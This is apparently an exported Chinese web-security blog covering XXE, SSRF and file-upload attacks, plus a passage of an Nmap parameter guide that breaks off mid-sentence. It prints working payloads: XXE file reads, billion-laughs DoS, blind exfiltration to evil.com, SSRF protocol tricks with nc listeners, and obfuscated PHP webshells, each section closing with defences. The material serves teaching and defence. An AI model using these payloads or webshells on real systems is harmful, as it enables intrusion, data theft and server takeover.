(第三行)定义 note 元素有四个元素："to、from、heading,、body"!ELEMENT to (第四行)定义 to 元素为 "#PCDATA" 类型!ELEMENT from (第五行)定义 from 元素为 "#PCDATA" 类型!ELEMENT heading (第六行)定义 heading 元素为 "#PCDATA" 类型!ELEMENT body (第七行)定义 body 元素为 "#PCDATA" 类型&lt;!ELEMENT note (to+,from*,heading?,body)&gt;+ 表示 此元素至少出现一次* 表示 此元素出现0次或多次? 表示 此元素出现0次或1次 PCDATA(parsed character data)是会被解析器解析的文本。这些文本将被解析器检查实体以及标记 CDATA(character data)是不会被解析器解析的文本。在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。 DTD实体 实体是用于定义引用普通文本或特殊字符的快捷方式的变量。实体引用是对实体的引用。实体可在内部或外部进行声明。 123456789101112131415161718192021222324252627282930313233343536内部实体：-----&lt;!ENTITY 实体名称 "实体的值"&gt;例子：&lt;!ENTITY writer "Bill Gates"&gt;&lt;!ENTITY copyright "Copyright W3School.com.cn"&gt;&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;外部实体：-----&lt;!ENTITY 实体名称 SYSTEM "URI/URL"&gt;&lt;!ENTITY writer SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd"&gt;&lt;!ENTITY copyright SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd"&gt;&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;参数实体：-----&lt;!ENTITY % 实体名称 "实体的值"&gt;或者&lt;!ENTITY % 实体名称 SYSTEM "URI"&gt;%name（参数实体）是在DTD中被引用的，而&amp;name（其余实体）是在xml文档中被引用的。公共实体：-----&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名" “公用DTD的URI"&gt;例子:&lt;?xml version="1.0″?&gt; &lt;!DOCTYPE configuration PUBLIC “-//mybatis.org//DTD Config 3.0//EN"“http://mybatis.org/dtd/mybatis-3-config.dtd"&gt; XXE Attack“XML External Entity attack” 即XXE XML外部实体攻击，举一个简单的例子： 1234567&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE a [&lt;!ENTITY xee SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;a&gt; &amp;xee;&lt;/a&gt; 可以看到，我们的外部实体引用指向了系统passwd文件，在解析xml时会将敏感信息返回。 XXE利用XXE读文件1234567&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE a [&lt;!ENTITY xee SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;a&gt; &amp;xee;&lt;/a&gt; 在外部实体引用是，不同的程序所支持URI协议是不一样的: 和读文件一样，也可进行内网端口扫描，访问不同端口，观察返回信息或者banner内容进行鉴别。 拒绝服务123456789101112131415&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE lolz [ &lt;!ENTITY lol "lol"&gt; &lt;!ELEMENT lolz (#PCDATA)&gt; &lt;!ENTITY lol1 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt; &lt;!ENTITY lol2 "&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;"&gt; &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt; &lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"&gt; &lt;!ENTITY lol5 "&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"&gt; &lt;!ENTITY lol6 "&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"&gt; &lt;!ENTITY lol7 "&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"&gt; &lt;!ENTITY lol8 "&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"&gt; &lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"&gt;]&gt;&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt; 这是一个著名的针对XML的billion laughs Dos攻击，其递归构造实体引用，其会产生3G左右的内存数据。 原理是：构造恶意的XML实体文件耗尽可用内存，因为许多XML解析器在解析XML文档时倾向于将它的整个结构保留在内存中，解析非常慢，造成了拒绝服务器攻击。 除了这种方式，还可以引用一个外部很大的xml文件，造成Dos攻击，如下: 12345&lt;?xml version='1.0'?&gt;&lt;!DOCTYPE data [&lt;!ENTITY dos SYSTEM "file:///publicServer.com/largeFile.xml" &gt;]&gt;&lt;data&gt;&amp;dos;&lt;/data&gt; 有回显情况123456&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt; 或者: 12345678910&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY % xxe SYSTEM "http://xxx.xxx.xxx/evil.dtd" &gt;%xxe;]&gt;&lt;foo&gt;&amp;evil;&lt;/foo&gt;-- 外部evil.dtd中的内容&lt;!ENTITY evil SYSTEM “file:///c:/windows/win.ini" &gt; simplexml_load_string()函数，用于转换形式良好的XML字符串为SimpleXMLElement对象，然后输出对象的键和元素.是有XXE漏洞的标志性函数。 这种XXE可以和SSRF相结合 blind XEE没有回显，采用外带数据通道提取数据 1234567891011&lt;?xml version="1.0" encoding="utf-8"?&gt; &lt;!DOCTYPE data [&lt;!ENTITY % file SYSTEM "file:///c://test/1.txt"&gt;&lt;!ENTITY % dtd SYSTEM "http://evil.com/evil.xml"&gt; %dtd; %all; ]&gt; &lt;value&gt;&amp;send;&lt;/value&gt;其中evil.xml内容:&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://evil.com/%file;'&gt;"&gt; 调用过程为：参数实体dtd调用外部实体evil.xml，然后又调用参数实体all，接着调用命名实体send，通过这种方式，将读取的文件通过触发访问的方式传到了所属的evil服务器。 使用php://filter 123456789101112&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=c:/test/1.txt"&gt;&lt;!ENTITY % dtd SYSTEM "http://evil.com/evil.xml"&gt;%dtd;%send;]&gt;&lt;root&gt;&lt;/root&gt;其中evil.xml文件内容为：&lt;!ENTITY % payload "&lt;!ENTITY &amp;#x25; send SYSTEM 'http://evil.com/?content=%file;'&gt;"&gt; %payload; 关于php://filter的用法，可以参考这篇文章 1234567php://filter是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流可以用如下一行代码将POST内容转换成base64编码并输出:php://filter/read=convert.base64-encode/resource=php://input将xee.php的内容bbase64编码输出:php://filter/read=convert.base64-encode/resource=./xxe.php 利用其编码解码有时可以绕过一些保护。 执行系统命令在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令 1234567&lt;?xml version="1.0" encoding="utf-8"?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM "expect://id" &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt; Content-Type修改在目前的web服务当中，很多服务器与客户端都是使用json格式进行数据交换的，而有些服务器虽然用户提交的是json或text格式，但其是可以解析xml格式内容的，这时候，通过修改HTTP头部Content-Type字段，有时可以构成XXE攻击。 假设正常通信数据包是这样的： 12345678910111213HTTP Request:POST /netspi HTTP/1.1Host: someserver.netspi.comAccept: application/jsonContent-Type: application/jsonContent-Length: 38&#123;"search":"name","value":"netspitest"&#125;HTTP Response:HTTP/1.1 200 OKContent-Type: application/jsonContent-Length: 43&#123;"id": "1"&#125; 可以修改为xml: 123456789101112HTTP Request:POST /netspi HTTP/1.1Host: someserver.netspi.comAccept: application/jsonContent-Type: application/xmlContent-Length: 112&lt;?xml version="1.0" encoding="UTF-8" ?&gt;&lt;root&gt;&lt;search&gt;name&lt;/search&gt;&lt;value&gt;netspitest&lt;/value&gt;&lt;/root&gt; 如果服务器相应为: 12345HTTP Response:HTTP/1.1 200 OKContent-Type: application/jsonContent-Length: 43&#123;"error": "no results for name netspitest"&#125; 这样就能确定很可能存在XXE漏洞，再按外部实体引用的方式去构造即可。 递归引用实体12345&lt;!DOCTYPE data [&lt;!ENTITY a "a&amp;b;" &gt;&lt;!ENTITY b "&amp;a;" &gt;]&gt;&lt;data&gt;&amp;a;&lt;/data&gt; 编码转换一些比较低级的黑名单可以通过修改xml编码的方式绕过: 12345678910111213&lt;?xml version="1.0" encoding="UTF-7" ?&gt;&lt;!DOCTYPE data [&lt;!ELEMENT data (#PCDATA)&gt;&lt;!ENTITY file SYSTEM "file:///sys/power/image_size"&gt;]&gt;&lt;data&gt;&amp;file;&lt;/data&gt;&lt;?xml version="1.0" encoding="UTF-16"?&gt;&lt;!DOCTYPE data [&lt;!ELEMENT data (#PCDATA)&gt;&lt;!ENTITY file SYSTEM "file:///sys/power/image_size"&gt;]&gt;&lt;data&gt;&amp;file;&lt;/data&gt; xml schema 实体攻击XML Schema：称为可扩展标记语言架构，用来定义XM文档的合法构建模块，类似 DTD，Schema是DTD的替代者, 它比DTD可以做更多的事情。常见的xml schema attack分为： schemaLocation noNamespaceSchemaLocation XInclude XSLT 攻击 schemaLocation123456789&lt;?xml version=’1.0′?&gt;&lt;!DOCTYPE data [&lt;!ENTITY % remote SYSTEM "http://publicServer.com/external_entity_attribute.dtd"&gt;%remote;]&gt;&lt;ttt:data xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:ttt="http://test.com/attack"xsi:schemaLocation="ttt http://publicServer.com/&amp;internal;"&gt;4&lt;/ttt:data&gt; noNamespaceSchemaLocation12345678&lt;?xml version=’1.0′?&gt;&lt;!DOCTYPE data [&lt;!ENTITY % remote SYSTEM "http://publicServer.com/external_entity_attribute.dtd"&gt;%remote;]&gt;&lt;data xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="http://publicServer.com/&amp;internal;"&gt;&lt;/data&gt; XInclude1234567&lt;?xml version="1.0″ encoding="utf-8″?&gt;&lt;!DOCTYPE data [&lt;!ENTITY % remote SYSTEM "http://publicServer.com/external_entity_attribute.dtd"&gt;%remote;]&gt;&lt;data xmlns:xi="http://www.w3.org/2001/XInclude"&gt;&lt;xi:include href="http://192.168.2.31/&amp;internal;" parse="text"&gt;&lt;/xi:include&gt;&lt;/data&gt; 其中属性值使用&amp;internal;的方式可以学习 XSLT AttackXML Out-Of-Band Data Retrieval，可以通过如下的方式先用document()获得目标主机的信息，然后使用concat()将数据与evil主机进行拼接，然后document()访问拼接后的地址，便可以在evil主机日志上获得信息。 123456&lt;xsl:variable name="payload" select="document('http://sensitive_host/',/)"/&gt;&lt;xsl:variable name="combine" select="concat("http://evilhost/",$payload)"/&gt; &lt;xsl:variable name="result" select="document($combine)"/&gt; 防御 禁用外部实体引用 过滤用户提交的XML数据 (&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC等字段) 123456789101112131415禁用外部实体引用php----- libxml_disable_entity_loader(true);java-----DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);python-----from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) 参考文章:web-in-security-xxe]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>web security</tag>
        <tag>xxe</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSRF利用与防御]]></title>
    <url>%2Fblog%2Fssrf%2F</url>
    <content type="text"><![CDATA[SSRF(Server-Side Request Forgery:服务器端请求伪造)是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统） SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。 SSRF 危害 可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息; 攻击运行在内网或本地的应用程序（比如溢出）; 对内网web应用进行指纹识别，通过访问默认文件实现; 攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）; 利用file协议读取本地文件等。 利用常见场景这里以php后台实现为例子 file_get_contents1234567891011&lt;?phpif (isset($_POST['url'])) &#123; $content = file_get_contents($_POST['url']); $filename ='./images/'.rand().';img1.jpg'; file_put_contents($filename, $content); echo $_POST['url']; $img = "&lt;img src=\"".$filename."\"/&gt;"; &#125; echo $img; ?&gt; 可以看到，后台使用file_get_contents函数从用户指定的url获取图片。然后把它用一个随即文件名保存在硬盘上，并展示给用户。但是没有对url进行过滤，可以恶意请求内网文件。 fsockopen123456789101112131415161718192021&lt;?php function GetFile($host,$port,$link) &#123; $fp = fsockopen($host, intval($port), $errno, $errstr, 30); if (!$fp) &#123; echo "$errstr (error number $errno) \n"; &#125; else &#123; $out = "GET $link HTTP/1.1\r\n"; $out .= "Host: $host\r\n"; $out .= "Connection: Close\r\n\r\n"; $out .= "\r\n"; fwrite($fp, $out); $contents=''; while (!feof($fp)) &#123; $contents.= fgets($fp, 1024); &#125; fclose($fp); return $contents; &#125; &#125;?&gt; 这段代码使用fsockopen函数实现获取用户制定url的数据（文件或者html）。这个函数会使用socket跟服务器建立tcp连接，传输原始数据。 curl_exec12345678910111213141516&lt;?php if (isset($_POST['url']))&#123;$link = $_POST['url'];$curlobj = curl_init();curl_setopt($curlobj, CURLOPT_POST, 0);curl_setopt($curlobj,CURLOPT_URL,$link);curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($curlobj);curl_close($curlobj);$filename = './curled/'.rand().'.txt';file_put_contents($filename, $result); echo $result;&#125;?&gt; 另外一个很常见的实现，使用curl获取数据 常见利用方式 分享：通过URL地址分享网页内容 转码服务 在线翻译 图片加载与下载：通过URL地址加载或下载图片 图片、文章收藏功能 未公开的api实现以及其他调用URL的功能 从URL关键字中寻找 12345678910111213share wap url link src source target u 3g display sourceURl imageURL domain 端口扫描大多数社交网站都提供了通过用户指定的url上传图片的功能。如果用户输入的url是无效的。大部分的web应用都会返回错误信息。攻击者可以输入一些不常见的但是有效的URL，比如 123http://example.com:8080/dir/images/http://example.com:22/dir/public/image.jpghttp://example.com:3306/dir/images/ 然后根据服务器的返回信息来判断端口是否开放。大部分应用并不会去判断端口，只要是有效的URL，就发出了请求。而大部分的TCP服务，在建立socket连接的时候就会发送banner信息，banner信息是ascii编码的，能够作为原始的html数据展示。当然，服务端在处理返回信息的时候一般不会直接展示，但是不同的错误码，返回信息的长度以及返回时间都可以作为依据来判断远程服务器的端口状态。 攻击应用程序通过端口扫描可以获知常见服务的状态，之后利用其漏洞进行利用。 注意：由于使用的是HTTP协议进行内容传输，注意编码。 内网web应用指纹识别识别内网应用使用的框架，平台，模块以及cms可以为后续的攻击提供很多帮助。大多数web应用框架都有一些独特的文件和目录。通过这些文件可以识别出应用的类型，甚至详细的版本。根据这些信息就可以针对性的搜集漏洞进行攻击。比如可以通过访问下列文件来判断phpMyAdmin是否安装： 123Request: http://127.0.0.1:8080/phpMyAdmin/themes/original/img/b_tblimport.pngRequest: http://127.0.0.1:8081/wp-content/themes/default/images/audio.jpgRequest: http://127.0.0.1:8082/profiles/minimal/translations/README.txt 1访问 http://10.0.0.1/portName.js 可以判断是否是Dlink 路由器 以及可以通过图片来分析 攻击内网web应用仅仅通过get方法可以攻击的web有很多，比如struts2命令执行等。 读取本地文件如果我们指定file协议，也可能读到服务器上的文件. URL协议支持URL格式不仅仅支持HTTP，还有以下协议，都可以被利用: SFTP 12345http://safebuff.com/ssrf.php?url=sftp://evil.com:11111/evil.com:$ nc -v -l 11111Connection from [192.168.0.10] port 11111 [tcp/*] accepted (family 2, sport 36136)SSH-2.0-libssh2_1.4.2 Dict 12345http://safebuff.com/ssrf.php?dict://attacker:11111/evil.com:$ nc -v -l 11111Connection from [192.168.0.10] port 11111 [tcp/*] accepted (family 2, sport 36136)CLIENT libcurl 7.40.0 gopher 1234567891011// http://safebuff.com/ssrf.php?url=http://evil.com/gopher.php&lt;?php header('Location: gopher://evil.com:12346/_HI%0AMultiline%0Atest');?&gt;evil.com:# nc -v -l 12346Listening on [0.0.0.0] (family 0, port 12346)Connection from [192.168.0.10] port 12346 [tcp/*] accepted (family 2, sport 49398)HIMultilinetest TFTP 12345http://safebuff.com/ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKETevil.com:# nc -v -u -l 12346Listening on [0.0.0.0] (family 0, port 12346)TESTUDPPACKEToctettsize0blksize512timeout6 利用URL解析问题URL的完整格式是这样的： 12345协议类型:[//[访问资源需要的凭证信息@]服务器地址[:端口号]][/资源层级UNIX文件路径]文件名[?查询][#片段ID]例如http:http(s)://username:passwd@www.baidu.com:80/test/test.php?id=1#level-1 在服务器地址前面加上无效的凭证信息有时可以绕过一些解析 IP地址绕过IP地址的格式不只有一种写法: 1234567898进制格式：0300.0250.0.116进制格式：0xC0.0xA8.0.110进制整数格式：323223552116进制整数格式：0xC0A80001部分省略写法:216.58.535720xD8.072.535720330.3854660 这些格式有时候可以帮助我们绕过一些检查。 利用302跳转当原始url通过了后台的检测，可以使用重定向来跳转的我们目标地址。 例如xip.io提供了重定向服务，即: 123192.168.0.1.xip.io==&gt;192.168.0.1 当然你也可以在自己的VPS上实现它。 当然这种情况也有可能因为192.168.0.1这种内网地址会被检测出来，可以使用短链的方式进行绕过。(tinyurl.com等) DNS Rebinding 我们首先来分析下，整个流程： 首先用户发送url 服务器后台提取url.host 后台根据host去请求DNS Server对应的IP地址 DNS Server返回IP地址 服务器后台判断是否为内网地址，若为内网地址，返回错误，否则根据url地址访问相应网站 获取相应内容 返回内容给用户 整个流程问题出现在第4、5步，其原因如下： 12345678DNS在解析域名时，可以返回一个TTL值，这个值用于设置此域名解析的生命周期，如果在第4步的时候设置TTL=0(即不缓存)那么在第5步通过了后台验证需要去访问url时，由于没有DNS缓存，还需要进行一次域名解析，这时，如果我们再返回的是内网地址，那么就可以成功绕过后台的检测。其核心思想就是 利用了DNS缓存的时间差其最终添加了8 9两条 注：win下DNS缓存可以通过 ipconfig /displaydns 查看linux 下 默认不进行dns缓存 防御 过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。 限制请求的端口为http常用的端口，比如，80,443,8080,8090。 黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。 禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp://等引起的问题。 参考文章：乌云2016白帽大会]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>web security</tag>
        <tag>ssrf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件上传漏洞利用与防御]]></title>
    <url>%2Fblog%2Ffile-upload%2F</url>
    <content type="text"><![CDATA[web站点经常会有上传头像等类似个性化设置功能，允许用户上传图片、视频等内容，这些功能点往往存在上传验证方式不严格的安全缺陷，这些安全缺陷在Web渗透中是非常关键的突破口，只要经过仔细测试分析上传验证机制，往往就能找到绕过验证的方法，进而上传恶意代码获取整个Web业务控制权，复杂一点的情况是配合 Web Server的解析漏洞来获取控制权。 常见的检验内容如下： 客户端检测(都可以通过抓包或者代理进行修改，所以不再分析) 检测文件扩展名 检测Content-Type内容 / MIME检测 检测跟Path参数相关的内容 检测跟文件extension相关的内容 检测内容是否合法或含有恶意代码 接下来我们根据这些内容进行绕过分析： 以下如不特殊注明，均是服务器端的操作。 常见检测方法检测文件扩展名如果服务器检测扩展名是简单的根据后缀名，例如： 12if filename.endswith('jpg'): xxx 这样可以通过直接修改后缀即可，因为修改文件名并不会改变文件内容。 当然，一般不会这么简单，一般后台可能会有黑名单或者白名单进行过滤。常见的绕过方法如下： 文件名大小写JpG、aSP 使用黑名单里没有的名单进行攻击 特殊文件名绕过文件名改为evil.jpg.或者evil.jpg_，文件名会被window自动去掉后面的点或者空格，需要注意此种方法仅对window有效，Unix/Linux系统没有这个特性。 0x00截断 1234Name = getname(http requests)//假如这一步获取到的文件名是evil.php .jpgType = gettype(name)//而在该函数中，是从后往前扫描文件扩展名，所以判断为jpg文件If(type == jpg)SaveFileToPath(UploadPath.name , name)//但在这里却是以0x00作为文件名截断，最后以evil.php存入路径里 上传.htaccess文件攻击 该文件仅在Apache平台上存在，IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。该文件的写法如下： 123&lt;FilesMatch "_php.gif"&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 保存为.htaccess文件。该文件的意思是，只要遇到文件名中包含有_php.gif字符串的，统一按照php文件来执行。该文件在Apache里默认是启用的,该方法比较常用。 MIME检测同样，如果是根据POST数据包的Content-Type进行检测，同样可以修改报文的头绕过检测。 目录路径检测上传的数据包中，如果存在path(或者其他名称)等能够操作上传路径的参数，例如： 123456例如upfile/可以尝试修改为:upfile.asp/”或者“upfile/1.asp/”或者“upfile/1.asp;满足IIS6.0解析漏洞 服务端文件内容检测一些文件上传其会检测文件的标志性内容，比如图片JPG、PNG、GIF的一些标志等等: JPG: FFD8 FFE0 0010 4A46 4946 00... =&gt; ...JFIF... PNG: 89 50 4E 47 =&gt; .PNG GIF: 4749 4638 3961 =&gt; GIF89a 具体图片内容解析，可以看我的这篇image文件格式解析 思路应该很清楚: 简单的拼接标识符 1234GIF89a(...some binary data for image...)&amp;lt;?php phpinfo(); ?&amp;gt;(... skipping the rest of binary data ...) 构造符合图片规则的图片，其数据部分用恶意代码填充，其余部分保证图片格式的正确性(例如长度、结构头等)，当服务器将其用php或其他语言解析时，触发恶意程序。类似思路在XSS中同样存在，我在这里详细写过方案，可以参考XSS-构造恶意图片 不过需要修改恶意代码内容 有时会有二次渲染的情况： 即有时服务器会把你上传的图片进行处理后作为结果，例如某个后台的调用GD库二次渲染的代码： 12345678910function image_gd_open($file, $extension)&#123;$extension = str_replace('jpg', 'jpeg', $extension);$open_func = 'imageCreateFrom'. $extension; //函数名变成 imageCreateFrompng 之类if (!function_exists($open_func))&#123;return FALSE;&#125;return $open_func($file); //变成 imagecreatefrompng('/tmp/php0lbTOn')&#125; 这种情况比较难以处理，如果知道二次渲染的方法，有时可以通过构造。还有就是攻击渲染器。 web server 漏洞利用Apache解析漏洞Apache某些版本存在 解析顺序漏洞, 即如果后缀不被apache识别，则其会向前缀方向查找，直到找到一个可被识别的类型： 1234例如：evil.php.abc.qqq由于.abc .qqq 不被识别，其会将其认为是.php类型 存在漏洞的版本： 123456WampServer2.0 All Version (WampServer2.0i / Apache 2.2.11) [Success]WampServer2.1 All Version (WampServer2.1e-x32 / Apache 2.2.17) [Success]Wamp5 All Version (Wamp5_1.7.4 / Apache 2.2.6) [Success]AppServ 2.4 All Version (AppServ - 2.4.9 / Apache 2.0.59) [Success]AppServ 2.5 All Version (AppServ - 2.5.10 / Apache 2.2.8) [Success]AppServ 2.6 All Version (AppServ - 2.6.0 / Apache 2.2.8) [Success] IIS解析漏洞IIS6.0 123456789101112131415文件类型xxx.com/logo.jpg=&gt;xxx.com/logo.asp;.jpg文件就会被当成asp文件来处理文件夹xxx.com/image/logo.jpg==&gt;xxx.com/image.asp/logo.jpg文件就会被当成asp文件来处理，其中image.asp是文件夹名 IIS7.0/7.5 对php解析有类似Nginx的解析漏洞只要对任意文件名在url后面追加上字符串/任意文件名.php就会按照php去解析 Nginx解析漏洞低版本有效 1234567test.jpg==&gt;test.jpg/x.php任意文件名/任意文件名.php”这个漏洞其实是出现自php-cgi的漏洞，所以其实跟Nginx自身是无关的test%.php都当作php来解析 文件名逻辑漏洞(CVE-2013-4547)受影响的nginx版本: 0.8.41至1.4.3和1.5.7之前的1.5.x 123空格+\0.phptest.jpg \0.php Windows相关文件名特性 大小写不敏感 Windows下的文件和文件夹名字中，不会出现以下9个英文字符： 1\ / : * ? " &lt; &gt; | 0x00—0x1F 范围间的ascii字符不能出现在文件和文件夹名字中 0x81—0xFE范围间的ascii字符不能出现在文件名字中，否则可能会报错 但如果字符结合下一个字符生成一个多字节字符，就能正常创建一个文件了 123test. + chr(0x81) + jsp，会生成"test.乯sp"文件test. + chr(0x81) + 3sp 就会报错 会被去除的文件名最后一位字符，循环去除的’.’号和空格字符 123456789"test.asp""Test.asp""TEST.ASP""test.asp.""test.asp ""TEST.jpg ...""test.asp:1.jpg..""Test.jpg .. ... ""test.jpg .. .�" （乱码字符是ascii值为 0xC8 的不可打印字符） 常见一句话木马1234567&lt;?php $_GET[a]($_GET[b]);?&gt;利用：http://localhost:8081/test/a.php?a=assert&amp;b=$&#123;fputs%28fopen%28base64\_decode%28Yy5waHA%3D%29,w%29,base64_decode%28PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x%29%29&#125;;其内容为:fputs(fopen(base64_decode(c.php),w),base64_decode(&lt;?php @eval($_POST[c]); ?&gt;1)) 其他利用: 1234567&lt;?php ($_=@$_GET[2]).@$_($_POST[sz])?&gt;&lt;?php $a = str_replace(x,"","axsxxsxexrxxt");$a($_POST["sz"]); ?&gt;&lt;?php $k="ass"."ert"; $k($&#123;"_PO"."ST"&#125; ['sz']);?&gt;&lt;?php $a = "a"."s"."s"."e"."r"."t"; $a($_POST["sz"]); ?&gt; 常见防御方法 检测的重点放在文件内容检测 路径/扩展名检测一定要用白名单 不能有本地文件包含漏洞 随时注意更新Web应用软件]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>web security</tag>
        <tag>file upload</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nmap 常用参数 & 使用技巧 - from DEFCON]]></title>
    <url>%2Fblog%2Fnmap%2F</url>
    <content type="text"><![CDATA[Nmap （网络映射器）是由 Gordon Lyon设计，用来探测计算机网络上的主机和服务的一种安全扫描器。为了绘制网络拓扑图，Nmap的发送特制的数据包到目标主机，然后对返回数据包进行分析。Nmap是一款枚举和测试网络的强大工具。 Nmap的作用: 主机探测：探测网络上的主机，例如列出响应TCP和ICMP请求、icmp请求、开放特别端口的主机。 端口扫描：探测目标主机所开放的端口。 版本检测：探测目标主机的网络服务，判断其服务名称及版本号。 系统检测：探测目标主机的操作系统及网络设备的硬件特性。 防火墙检测: 探测目标主机使用什么类型的报文过滤器/防火墙 支持探测脚本的编写：使用Nmap的脚本引擎（NSE）和Lua编程语言。 常用参数目标说明 -iL &lt;inputfilename&gt;从列表中输入 -iR &lt;num hosts&gt; 随机选取n个主机，0表示无限 --exclude &lt;host1[,host2][,host3],...&gt; 排除这些主机 --excludefile &lt;exclude_file&gt; 排除文件中的这些主机 主机发现由于不同的用户对感兴趣的主机服务不一样，Nmap提供了多种不同的方式。 -sL 列表扫描，打印主机列表 -sP 仅仅使用ping进行主机发现,默认情况下会发送一个ICMP回声请求和一个TCP报文到80端口 -P0 无视主机发现，均认为是活跃的。 -PS TCP SYN Ping 尝试发送SYN包，如果收到SYN/ACK即认为正在运行 -PA TCP ACK Ping 尝试发送ACK包，回应RST报文即为运行 -PU 发送一个空的UDP包，如果收到无法到达说明机器正在运行 PS PA PU如果不指定端口，默认为31338端口，使用这个端口的原因是选择一个不常用的端口进行主机活跃性探测。 扫描方式Nmap所识别的6个端口状态 端口状态 说明 open 应用程序正在该端口接收TCP 连接或者UDP报文 close 关闭的端口对于Nmap也是可访问的(它接受Nmap的探测报文并作出响应)， 但没有应用程序在其上监听。 filtered 由于包过滤阻止探测报文到达端口， Nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，路由器规则 或者主机上的软件防火墙。 unfiltered 未被过滤状态意味着端口可访问，但Nmap不能确定它是开放还是关闭。 只有用于映射防火墙规则集的ACK扫描才会把端口分类到这种状态。 open or filtered 当无法确定端口是开放还是被过滤的，Nmap就把该端口划分成 这种状态。开放的端口不响应就是一个例子。 closed or filtered 该状态用于Nmap不能确定端口是关闭的还是被过滤的。 它只可能出现在IPID Idle扫描中 常见的扫描方式: -sS TCP SYN扫描 默认方式，只发送SYN包，不建立连接。 -ST TCP connect()扫描 用户没有权限发送原始报文时，采用这种方式 -sU UDP扫描 -sN;-sF;-sX TCP null、FIN、Xmas扫描 1234567891011121314151617这三种扫描类型 (甚至用下一节描述的 --scanflags 选项的更多类型) 在TCP RFC 中发掘了一个微妙的方法来区分open(开放的)和 closed(关闭的)端口。如果 [目标]端口状态是关闭的： 请求的的不含RST的报文导致一个RST响应。如果不设置SYN，RST，或者ACK位的报文发送到开放端口，理论上，这不应该发生，如果您确实收到了，丢弃该报文，返回。那么有以下规则：如果扫描系统遵循该RFC，当端口关闭时，任何不包含SYN，RST，或者ACK位的报文会导致 一个RST返回，而当端口开放时，应该没有任何响应。只要不包含SYN，RST，或者ACK, 任何其它三种(FIN，PSH，and 